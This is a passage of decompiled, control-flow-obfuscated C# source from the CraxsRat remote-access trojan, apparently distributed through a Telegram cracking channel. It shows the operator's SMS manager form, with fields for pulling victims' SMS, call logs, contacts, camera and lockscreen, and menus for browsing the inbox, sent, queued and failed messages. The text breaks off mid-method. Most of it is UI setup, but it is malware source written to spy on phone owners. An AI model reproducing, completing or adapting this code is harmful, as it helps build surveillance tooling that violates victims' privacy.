// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.SMSManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class SMSManager : Form
  {
    public static string getinfo;
    public static string getCalls;
    public static string getSMS;
    public static string getContacts;
    public static string getCamera;
    public static string Lockscreen;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Client) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
label_1:
      int num1 = 1450296320;
      DataGridViewCellStyle gridViewCellStyle2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 - -273871813 * (1115584967 * ~-1853090900 * 1329551693)) * -1140152819 * -1841747505)) % 143U)
        {
          case 0:
            this.DrakeUIToolTip1 = new DrakeUIToolTip(((Client) this).components);
            num1 = (int) num2 * 438095422 ^ 1104793680;
            continue;
          case 2:
            this.OutboxToolStripMenuItem.Text = EXGuarder.\u00332513E56;
            num1 = (int) num2 * 1781271888 ^ -1900012970;
            continue;
          case 3:
            this.SaveToolStripMenuItem.Name = EXGuarder.\u003044F5768;
            this.SaveToolStripMenuItem.Size = new Size(104, 24);
            num1 = (int) num2 * -1087569440 ^ 318129644;
            continue;
          case 4:
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * -1949524372 ^ 145633373;
            continue;
          case 5:
            this.Column7.Width = 60;
            this.Column2.HeaderText = EXGuarder.\u0031D30282C;
            this.Column2.Name = EXGuarder.\u0036E5F433D;
            num1 = (int) num2 * 1826859418 ^ -394366668;
            continue;
          case 6:
            this.Column3.Width = 2;
            this.ctx.ImageScalingSize = new Size(20, 20);
            num1 = (int) num2 * -1520477276 ^ 1162674943;
            continue;
          case 7:
            this.DGV0.Margin = new Padding(4);
            this.DGV0.Name = EXGuarder.\u003633D2274;
            num1 = (int) num2 * -745660671 ^ 1589935921;
            continue;
          case 8:
            this.clinameinfo.Size = new Size(544, 39);
            num1 = (int) num2 * -1850358281 ^ 2088652708;
            continue;
          case 9:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            num1 = (int) num2 * -1319084431 ^ 1978236386;
            continue;
          case 10:
            goto label_1;
          case 11:
            this.DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * 1388146334 ^ 1039485011;
            continue;
          case 12:
            ((ISupportInitialize) this.BoxTitle).EndInit();
            num1 = (int) num2 * -420640658 ^ -1537177449;
            continue;
          case 13:
            this.ClientPic.Size = new Size(42, 39);
            num1 = (int) num2 * 1913001331 ^ 763235066;
            continue;
          case 14:
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * 1790035170 ^ -1292148027;
            continue;
          case 15:
            this.SentToolStripMenuItem.Size = new Size(134, 26);
            this.SentToolStripMenuItem.Text = EXGuarder.\u003294E4C16;
            this.QueuedToolStripMenuItem.Name = EXGuarder.\u0034B566825;
            num1 = (int) num2 * 1080519653 ^ -1145766543;
            continue;
          case 16:
            ((ISupportInitialize) this.ClientPic).BeginInit();
            num1 = (int) num2 * 1729049938 ^ 126838181;
            continue;
          case 17:
            this.ClientPic.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num2 * 1546042608 ^ 1470855173;
            continue;
          case 18:
            this.OutboxToolStripMenuItem.Size = new Size(134, 26);
            num1 = (int) num2 * 654050277 ^ -907046964;
            continue;
          case 19:
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * 1947220476 ^ -1679051003;
            continue;
          case 20:
            this.Panel2.Location = new Point(0, 0);
            num1 = (int) num2 * 1407151675 ^ 1236177449;
            continue;
          case 21:
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * 419181862 ^ 1340530690;
            continue;
          case 22:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * -1543622019 ^ -28175469;
            continue;
          case 23:
            this.PB.Margin = new Padding(4);
            num1 = (int) num2 * 1511545755 ^ 1185168391;
            continue;
          case 24:
            this.ctx.Items.AddRange(new ToolStripItem[3]
            {
              (ToolStripItem) this.PathsToolStripMenuItem,
              (ToolStripItem) this.SaveToolStripMenuItem,
              (ToolStripItem) this.SaveAsToolStripMenuItem
            });
            this.ctx.Name = EXGuarder.\u0034674691E;
            num1 = (int) num2 * -248426389 ^ 2086463883;
            continue;
          case 25:
            this.Column6.HeaderText = EXGuarder.\u0035F0C323C;
            this.Column6.Name = EXGuarder.\u0030F596E70;
            this.Column6.Width = 68;
            num1 = (int) num2 * -1877227593 ^ -762307464;
            continue;
          case 26:
            this.Column7.HeaderText = EXGuarder.\u0031D641A62;
            num1 = (int) num2 * -757672060 ^ 493921476;
            continue;
          case 27:
            this.DrakeUIAvatar1.Location = new Point(524, 457);
            this.DrakeUIAvatar1.Name = EXGuarder.\u0030C422B2B;
            this.DrakeUIAvatar1.Size = new Size(56, 46);
            this.DrakeUIAvatar1.Style = UIStyle.Custom;
            this.DrakeUIAvatar1.Symbol = 61579;
            this.DrakeUIAvatar1.TabIndex = 9;
            num1 = (int) num2 * 2090474713 ^ -315404082;
            continue;
          case 28:
            this.InboxToolStripMenuItem.Size = new Size(134, 26);
            num1 = (int) num2 * -1924580132 ^ -496375177;
            continue;
          case 29:
            this.Panel1.Name = EXGuarder.\u0031C3B6C5F;
            num1 = (int) num2 * -184167748 ^ 621369634;
            continue;
          case 30:
            this.BoxTitle = new PictureBox();
            this.DrakeUIAvatar1 = new DrakeUIAvatar();
            num1 = (int) num2 * -270492847 ^ 1858843693;
            continue;
          case 31:
            this.DGV0.TabIndex = 3;
            num1 = (int) num2 * 1995639421 ^ 94120744;
            continue;
          case 32:
            this.TOpacity = new System.Windows.Forms.Timer(((Client) this).components);
            num1 = (int) num2 * -574250559 ^ 146307795;
            continue;
          case 33:
            this.PathsToolStripMenuItem.Text = EXGuarder.\u003575C495F;
            num1 = (int) num2 * -2066664366 ^ -1593387478;
            continue;
          case 34:
            this.Column3 = new DataGridViewImageColumn();
            num1 = (int) num2 * -345389389 ^ 1605719971;
            continue;
          case 35:
            this.showtext.BorderStyle = BorderStyle.FixedSingle;
            this.showtext.Dock = DockStyle.Fill;
            num1 = (int) num2 * -2110455508 ^ -1257982461;
            continue;
          case 36:
            this.DrakeUIToolTip1.OwnerDraw = true;
            this.Panel2.BackColor = Color.Black;
            num1 = (int) num2 * 1448346168 ^ 818713166;
            continue;
          case 37:
            this.showtext.Size = new Size(383, 544);
            num1 = (int) num2 * -184018742 ^ 1501447465;
            continue;
          case 38:
            this.AllToolStripMenuItem.Name = EXGuarder.\u0031B3A511D;
            this.AllToolStripMenuItem.Size = new Size(134, 26);
            num1 = (int) num2 * -1019413974 ^ 1440038763;
            continue;
          case 39:
            this.showtext.Name = EXGuarder.\u00332793B37;
            num1 = (int) num2 * 672959210 ^ 1793154903;
            continue;
          case 40:
            this.PB.Size = new Size(586, 12);
            num1 = (int) num2 * 1373284065 ^ 732488894;
            continue;
          case 41:
            this.PathsToolStripMenuItem.Name = EXGuarder.\u003604C484E;
            num1 = (int) num2 * 816075518 ^ 1330489141;
            continue;
          case 42:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6, (DataGridViewColumn) this.Column9, (DataGridViewColumn) this.Column7, (DataGridViewColumn) this.Column2, (DataGridViewColumn) this.Column3);
            this.DGV0.ContextMenuStrip = this.ctx;
            num1 = (int) num2 * -1987797579 ^ 102385779;
            continue;
          case 43:
            this.ctx = new ContextMenuStrip(((Client) this).components);
            this.PathsToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -797340746 ^ -1185363987;
            continue;
          case 44:
            this.ctx.ResumeLayout(false);
            num1 = (int) num2 * 759184521 ^ -1451357951;
            continue;
          case 45:
            this.Panel1.SuspendLayout();
            this.SuspendLayout();
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -582772783 ^ -1596345148;
            continue;
          case 46:
            this.ctx.Size = new Size(105, 76);
            this.PathsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[6]
            {
              (ToolStripItem) this.AllToolStripMenuItem,
              (ToolStripItem) this.OutboxToolStripMenuItem,
              (ToolStripItem) this.InboxToolStripMenuItem,
              (ToolStripItem) this.SentToolStripMenuItem,
              (ToolStripItem) this.QueuedToolStripMenuItem,
              (ToolStripItem) this.FailedToolStripMenuItem
            });
            num1 = (int) num2 * -193705110 ^ 502839506;
            continue;
          case 47:
            this.Column3.HeaderText = EXGuarder.\u0030E4A414C;
            this.Column3.MinimumWidth = 2;
            this.Column3.Name = EXGuarder.\u00318357716;
            this.Column3.SortMode = DataGridViewColumnSortMode.Programmatic;
            num1 = (int) num2 * 1005323704 ^ -1804989872;
            continue;
          case 48:
            this.clinameinfo.Dock = DockStyle.Fill;
            this.clinameinfo.Font = new Font(EXGuarder.\u003300A3814, 9f);
            this.clinameinfo.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.clinameinfo.Location = new Point(42, 0);
            this.clinameinfo.Name = EXGuarder.\u00367242502;
            num1 = (int) num2 * 939344352 ^ 963084478;
            continue;
          case 49:
            this.ClientPic.Name = EXGuarder.\u00348570944;
            num1 = (int) num2 * -1831657559 ^ 1174403100;
            continue;
          case 50:
            this.Panel2.ForeColor = Color.Red;
            num1 = (int) num2 * 70213109 ^ 634990567;
            continue;
          case 51:
            this.Panel1.Dock = DockStyle.Right;
            this.Panel1.Font = new Font(EXGuarder.\u003300A3814, 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Panel1.ForeColor = Color.White;
            num1 = (int) num2 * 891386061 ^ 1340471834;
            continue;
          case 52:
            this.OutboxToolStripMenuItem.Name = EXGuarder.\u0034C1A774A;
            num1 = (int) num2 * 287606840 ^ -317067886;
            continue;
          case 53:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u003300A3814, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 261160327 ^ 20611655;
            continue;
          case 54:
            this.BoxTitle.Name = EXGuarder.\u00308005579;
            num1 = (int) num2 * -1549779681 ^ -1858607980;
            continue;
          case 55:
            this.AllToolStripMenuItem.Text = EXGuarder.\u00319423250;
            num1 = (int) num2 * 1514886373 ^ -122577650;
            continue;
          case 56:
            this.PB.Name = EXGuarder.\u0037128145D;
            num1 = (int) num2 * 1134264689 ^ -671669730;
            continue;
          case 57:
            this.SaveAsToolStripMenuItem.Size = new Size(104, 24);
            num1 = (int) num2 * -441265268 ^ 1436239260;
            continue;
          case 58:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * 1285380418 ^ -132118547;
            continue;
          case 59:
            this.showtext.ForeColor = Color.White;
            num1 = (int) num2 * -814619173 ^ 781617322;
            continue;
          case 60:
            this.ctx.SuspendLayout();
            num1 = (int) num2 * 1726232772 ^ 824515517;
            continue;
          case 61:
            this.SaveToolStripMenuItem.Visible = false;
            num1 = (int) num2 * 1089657131 ^ -876248098;
            continue;
          case 62:
            this.Column1.HeaderText = EXGuarder.\u0034D6C1809;
            num1 = (int) num2 * -593422747 ^ 1618534736;
            continue;
          case 63:
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            this.DGV0.BackgroundColor = Color.Black;
            this.DGV0.BorderStyle = BorderStyle.None;
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * -2064224861 ^ 1050609057;
            continue;
          case 64:
            this.Name = EXGuarder.\u0033B5C3D58;
            this.Opacity = 0.0;
            this.ShowIcon = false;
            this.Text = EXGuarder.\u0033B5C3D58;
            num1 = (int) num2 * -1960890218 ^ 242983544;
            continue;
          case 65:
            this.ClientSize = new Size(969, 544);
            this.Controls.Add((Control) this.DrakeUIAvatar1);
            this.Controls.Add((Control) this.DGV0);
            this.Controls.Add((Control) this.PB);
            this.Controls.Add((Control) this.BoxTitle);
            num1 = (int) num2 * 1680010991 ^ -1935674834;
            continue;
          case 66:
            this.DrakeUIAvatar1.BackColor = Color.Transparent;
            this.DrakeUIAvatar1.Cursor = Cursors.Hand;
            this.DrakeUIAvatar1.FillColor = Color.Black;
            num1 = (int) num2 * 1459341675 ^ -675275477;
            continue;
          case 67:
            this.Column2.Width = 63;
            this.Column3.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
            this.Column3.FillWeight = 1f;
            num1 = (int) num2 * -1876610311 ^ 90820698;
            continue;
          case 68:
            this.Panel2.Name = EXGuarder.\u003274F4852;
            this.Panel2.Size = new Size(586, 39);
            num1 = (int) num2 * 1034636039 ^ 1682265755;
            continue;
          case 69:
            this.showtext.Multiline = true;
            num1 = (int) num2 * -1395272327 ^ 1755117939;
            continue;
          case 70:
            this.InboxToolStripMenuItem.Name = EXGuarder.\u0034E03400A;
            num1 = (int) num2 * 147846840 ^ -1600085893;
            continue;
          case 71:
            this.DrakeUIAvatar1.Text = EXGuarder.\u0030C422B2B;
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar1, EXGuarder.\u003573C1154);
            this.DrakeUIToolTip1.BackColor = Color.FromArgb(54, 54, 54);
            num1 = (int) num2 * 1534568518 ^ -723643378;
            continue;
          case 72:
            this.QueuedToolStripMenuItem.Text = EXGuarder.\u0030E680B2F;
            this.FailedToolStripMenuItem.Name = EXGuarder.\u0035C321F40;
            this.FailedToolStripMenuItem.Size = new Size(134, 26);
            this.FailedToolStripMenuItem.Text = EXGuarder.\u00327673146;
            num1 = (int) num2 * -1724735539 ^ 1987996879;
            continue;
          case 73:
            this.SaveAsToolStripMenuItem.Visible = false;
            this.TOpacity.Interval = 1;
            this.PB.Dock = DockStyle.Bottom;
            this.PB.Location = new Point(0, 510);
            num1 = (int) num2 * 1069320571 ^ 1779698980;
            continue;
          case 74:
            this.DGV0 = new DataGridView();
            num1 = (int) num2 * 1188403978 ^ -1774391983;
            continue;
          case 75:
            this.PathsToolStripMenuItem.Size = new Size(104, 24);
            num1 = (int) num2 * -853396227 ^ 181975093;
            continue;
          case 76:
            this.SaveAsToolStripMenuItem.Name = EXGuarder.\u003470B5D25;
            num1 = (int) num2 * -1806338178 ^ -1374717176;
            continue;
          case 77:
            this.SaveToolStripMenuItem.Text = EXGuarder.\u003314E6457;
            num1 = (int) num2 * 960367476 ^ 486312164;
            continue;
          case 78:
            this.Panel1.Location = new Point(586, 0);
            num1 = (int) num2 * -878962857 ^ -291551612;
            continue;
          case 79:
            this.DGV0.RowHeadersVisible = false;
            num1 = (int) num2 * -1275498099 ^ -748022062;
            continue;
          case 80:
            this.BoxTitle.Dock = DockStyle.Bottom;
            this.BoxTitle.ErrorImage = (Image) null;
            num1 = (int) num2 * -1599780297 ^ -955608700;
            continue;
          case 81:
            this.SentToolStripMenuItem.Name = EXGuarder.\u0036B6C4D6B;
            num1 = (int) num2 * 1264536028 ^ -2100556803;
            continue;
          case 82:
            this.SaveAsToolStripMenuItem.Text = EXGuarder.\u003166A284A;
            num1 = (int) num2 * 2134870820 ^ 1611884749;
            continue;
          case 83:
            this.Column7.Name = EXGuarder.\u0034A262850;
            num1 = (int) num2 * 1869228021 ^ -1081437184;
            continue;
          case 84:
            this.DrakeUIAvatar1.Font = new Font(EXGuarder.\u003300A3814, 12f);
            num1 = (int) num2 * -329237734 ^ -2034818000;
            continue;
          case 85:
            this.Panel2 = new Panel();
            num1 = (int) num2 * 326720462 ^ -2018082237;
            continue;
          case 86:
            this.Panel1.Size = new Size(383, 544);
            this.Panel1.TabIndex = 11;
            num1 = (int) num2 * 915770911 ^ 892060720;
            continue;
          case 87:
            this.InboxToolStripMenuItem.Text = EXGuarder.\u00352225772;
            num1 = (int) num2 * -45147758 ^ -235125829;
            continue;
          case 88:
            this.BoxTitle.InitialImage = (Image) null;
            num1 = (int) num2 * 530250559 ^ 2087981036;
            continue;
          case 89:
            this.Column1.Name = EXGuarder.\u003660E581D;
            num1 = (int) num2 * 79206884 ^ 1258744218;
            continue;
          case 90:
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            this.DGV0.Location = new Point(0, 39);
            num1 = (int) num2 * 1535974785 ^ -1363383545;
            continue;
          case 91:
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            this.Panel1.BackColor = Color.Black;
            this.Panel1.Controls.Add((Control) this.showtext);
            num1 = (int) num2 * -1870358109 ^ 273598671;
            continue;
          case 92:
            this.DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            num1 = (int) num2 * -1400034509 ^ -546019351;
            continue;
          case 93:
            this.Controls.Add((Control) this.Panel2);
            this.Controls.Add((Control) this.Panel1);
            this.Margin = new Padding(4);
            num1 = (int) num2 * 828834401 ^ -1220504632;
            continue;
          case 94:
            ((ISupportInitialize) this.BoxTitle).BeginInit();
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * -781544203 ^ 1178226490;
            continue;
          case 95:
            this.Column7 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 2137560833 ^ 1034224945;
            continue;
          case 96:
            this.showtext.BackColor = Color.Black;
            num1 = (int) num2 * -1829809000 ^ 1803564155;
            continue;
          case 97:
            this.ClientPic = new PictureBox();
            num1 = (int) num2 * 659393283 ^ 698622086;
            continue;
          case 98:
            this.AllToolStripMenuItem = new ToolStripMenuItem();
            this.OutboxToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -664613928 ^ 116111319;
            continue;
          case 99:
            this.BoxTitle.Margin = new Padding(4);
            num1 = (int) num2 * -814459149 ^ -528596794;
            continue;
          case 100:
            this.DGV0.Dock = DockStyle.Fill;
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * 884917591 ^ 1598413215;
            continue;
          case 101:
            this.Column2 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1016634194 ^ -1097838083;
            continue;
          case 102:
            this.Panel2.TabIndex = 10;
            num1 = (int) num2 * -2030830315 ^ -1604244720;
            continue;
          case 103:
            this.BoxTitle.BackColor = Color.Black;
            num1 = (int) num2 * 1584335997 ^ -213411024;
            continue;
          case 104:
            this.clinameinfo.Text = EXGuarder.\u003130C0950;
            this.clinameinfo.TextAlign = ContentAlignment.MiddleLeft;
            this.ClientPic.Dock = DockStyle.Left;
            this.ClientPic.Location = new Point(0, 0);
            num1 = (int) num2 * -1462055812 ^ -1225679003;
            continue;
          case 105:
            this.SaveToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -80614944 ^ 1087222272;
            continue;
          case 106:
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            num1 = (int) num2 * 1948678938 ^ 1853753738;
            continue;
          case 107:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * -49449569 ^ -1601786783;
            continue;
          case 108:
            this.clinameinfo = new Label();
            num1 = (int) num2 * -430944476 ^ 598094203;
            continue;
          case 109:
            this.Column1 = new DataGridViewTextBoxColumn();
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1510663922 ^ -951800671;
            continue;
          case 110:
            this.showtext.Location = new Point(0, 0);
            num1 = (int) num2 * -352023514 ^ -2092497235;
            continue;
          case 111:
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 46278401 ^ 721162134;
            continue;
          case 112:
            this.Column1.Width = 82;
            num1 = (int) num2 * -155091322 ^ -1251309175;
            continue;
          case 113:
            this.ctx.ShowImageMargin = false;
            num1 = (int) num2 * -2102156129 ^ 609412439;
            continue;
          case 114:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 1714342800 ^ -1018249986;
            continue;
          case 115:
            this.Column9.Width = 62;
            num1 = (int) num2 * 164280919 ^ -1732590885;
            continue;
          case 116:
            this.InboxToolStripMenuItem = new ToolStripMenuItem();
            this.SentToolStripMenuItem = new ToolStripMenuItem();
            this.QueuedToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -495293564 ^ 1227926729;
            continue;
          case 117:
            this.BoxTitle.Size = new Size(586, 22);
            this.BoxTitle.TabIndex = 7;
            this.BoxTitle.TabStop = false;
            num1 = (int) num2 * 827911085 ^ 739510449;
            continue;
          case 118:
            this.PB.TabIndex = 6;
            num1 = (int) num2 * -2080831043 ^ 301941393;
            continue;
          case 119:
            this.DGV0.Size = new Size(586, 471);
            num1 = (int) num2 * -1966904275 ^ 515179663;
            continue;
          case 120:
            this.Panel1.ResumeLayout(false);
            num1 = (int) num2 * -723502593 ^ 249354970;
            continue;
          case 121:
            this.ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -821068540 ^ -1705228838;
            continue;
          case 122:
            this.clinameinfo.BackColor = Color.Transparent;
            num1 = (int) num2 * -921171356 ^ 616311538;
            continue;
          case 123:
            this.clinameinfo.TabIndex = 12;
            num1 = (int) num2 * -738062180 ^ 57692205;
            continue;
          case 124:
            this.DrakeUIAvatar1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -439221314 ^ 1752274587;
            continue;
          case 125:
            this.Column9 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 749053793 ^ 1427898927;
            continue;
          case 126:
            this.Panel2.ResumeLayout(false);
            ((ISupportInitialize) this.ClientPic).EndInit();
            num1 = (int) num2 * -1260202942 ^ 283603602;
            continue;
          case (uint) sbyte.MaxValue:
            this.PB = new ProgressBar();
            num1 = (int) num2 * -633621162 ^ -184882891;
            continue;
          case 128:
            ((ISupportInitialize) this.DGV0).EndInit();
            num1 = (int) num2 * -166568051 ^ 1718989391;
            continue;
          case 129:
            this.DGV0.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * 1730212141 ^ -738010641;
            continue;
          case 130:
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -722894354 ^ 1658078065;
            continue;
          case 131:
            this.showtext.TabIndex = 0;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.Black;
            num1 = (int) num2 * -1533449035 ^ 777953924;
            continue;
          case 132:
            this.QueuedToolStripMenuItem.Size = new Size(134, 26);
            num1 = (int) num2 * 708054437 ^ 1263711362;
            continue;
          case 133:
            this.Column9.HeaderText = EXGuarder.\u00332350127;
            this.Column9.Name = EXGuarder.\u0032766606E;
            num1 = (int) num2 * 1848875888 ^ 605175393;
            continue;
          case 134:
            this.DrakeUIAvatar1.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            num1 = (int) num2 * 517168874 ^ 321433136;
            continue;
          case 135:
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 102921567 ^ -50955852;
            continue;
          case 136:
            this.Panel1 = new Panel();
            this.showtext = new TextBox();
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * -2004888239 ^ -545331545;
            continue;
          case 137:
            this.BoxTitle.Location = new Point(0, 522);
            num1 = (int) num2 * 2112947180 ^ -1648773810;
            continue;
          case 138:
            gridViewCellStyle1.BackColor = Color.Black;
            gridViewCellStyle1.Font = new Font(EXGuarder.\u003300A3814, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1248946263 ^ -1765856201;
            continue;
          case 139:
            this.FailedToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -2094074969 ^ 35569405;
            continue;
          case 140:
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * -1884685987 ^ -455607784;
            continue;
          case 141:
            this.SaveAsToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 597027700 ^ 463895157;
            continue;
          case 142:
            this.Panel2.Controls.Add((Control) this.clinameinfo);
            this.Panel2.Controls.Add((Control) this.ClientPic);
            num1 = (int) num2 * 2006593879 ^ 1034068651;
            continue;
          default:
            goto label_144;
        }
      }
label_144:
      this.Panel1.PerformLayout();
      this.ResumeLayout(false);
    }

    internal virtual DataGridView DGV0
    {
      get => ((Client) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler1 = new DataGridViewCellEventHandler(this.DGV0_CellContentClick);
        DataGridViewCellEventHandler cellEventHandler2 = new DataGridViewCellEventHandler(this.DGV0_CellClick);
        DataGridViewCellEventHandler cellEventHandler3 = new DataGridViewCellEventHandler(this.DGV0_RowEnter);
label_1:
        int num1 = 793137063;
        DataGridView dgV0;
        DataGridViewRowsAddedEventHandler addedEventHandler;
        EventHandler eventHandler;
        DataGridViewRowsRemovedEventHandler removedEventHandler;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-~num1 - -(-2041257566 ^ ~-1171880342) - (393158186 - 896493725 + (-1070748916 - -109208817)) ^ -488712911)) % 17U)
          {
            case 0:
              dgV0 = ((Client) this)._DGV0;
              num1 = (int) num2 * -828533504 ^ 1787088285;
              continue;
            case 1:
              removedEventHandler = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
              num1 = (int) num2 * 1647718017 ^ 1469282639;
              continue;
            case 2:
              dgV0.CellContentClick += cellEventHandler1;
              num1 = (int) num2 * -1605395833 ^ 923030793;
              continue;
            case 3:
              dgV0.CellClick -= cellEventHandler2;
              num1 = (int) num2 * -351294846 ^ 954455252;
              continue;
            case 4:
              dgV0.RowEnter += cellEventHandler3;
              num1 = (int) num2 * -592311093 ^ -2548869;
              continue;
            case 5:
              addedEventHandler = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
              num1 = (int) num2 * 1177091574 ^ -1462135851;
              continue;
            case 6:
              dgV0.SelectionChanged -= eventHandler;
              num1 = (int) num2 * 1044277445 ^ -1971066988;
              continue;
            case 7:
              dgV0.CellContentClick -= cellEventHandler1;
              num1 = (int) num2 * 1932514768 ^ -817134803;
              continue;
            case 8:
              goto label_3;
            case 9:
              eventHandler = new EventHandler(this.DGV0_SelectionChanged);
              num1 = (int) num2 * -1923321666 ^ -1111040174;
              continue;
            case 10:
              ((Client) this)._DGV0 = value;
              dgV0 = ((Client) this)._DGV0;
              int num3;
              num1 = num3 = dgV0 == null ? 421009418 : (num3 = 1157164608);
              continue;
            case 11:
              dgV0.RowsRemoved += removedEventHandler;
              dgV0.RowsAdded += addedEventHandler;
              dgV0.SelectionChanged += eventHandler;
              num1 = (int) num2 * -1505894393 ^ 699166430;
              continue;
            case 12:
              dgV0.RowsAdded -= addedEventHandler;
              num1 = (int) num2 * -422586469 ^ 479383748;
              continue;
            case 13:
              dgV0.RowEnter -= cellEventHandler3;
              dgV0.RowsRemoved -= removedEventHandler;
              num1 = (int) num2 * -1855238132 ^ 491569052;
              continue;
            case 14:
              goto label_1;
            case 15:
              dgV0.CellClick += cellEventHandler2;
              num1 = (int) num2 * -682025626 ^ 255811789;
              continue;
            case 16:
              int num4 = dgV0 == null ? 318756026 : (num4 = -1552836375);
              num1 = num4 ^ (int) num2 * -1052283833;
              continue;
            default:
              goto label_19;
          }
        }
label_3:
        return;
label_19:;
      }
    }

    internal virtual ContextMenuStrip ctx
    {
      get => ((Client) this)._ctx;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._ctx = value;
    }

    internal virtual ToolStripMenuItem PathsToolStripMenuItem
    {
      get => ((Client) this)._PathsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Client) this)._PathsToolStripMenuItem = value;
      }
    }

    internal virtual ToolStripMenuItem AllToolStripMenuItem
    {
      get => ((Client) this)._AllToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AllToolStripMenuItem_Click);
label_1:
        int num1 = -1832814317;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) ((~1146728185 ^ -288500229 - 1114839879) - ~~(num2 - -((~94213389 - (1003922042 ^ 1259441236) - (231902081 + 568056816 - ~-1089599811)) * 1049804409)))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -798885266 ^ -1925677567;
              continue;
            case 2:
              toolStripMenuItem = ((Client) this)._AllToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? -1469051049 : (num4 = -1357562226);
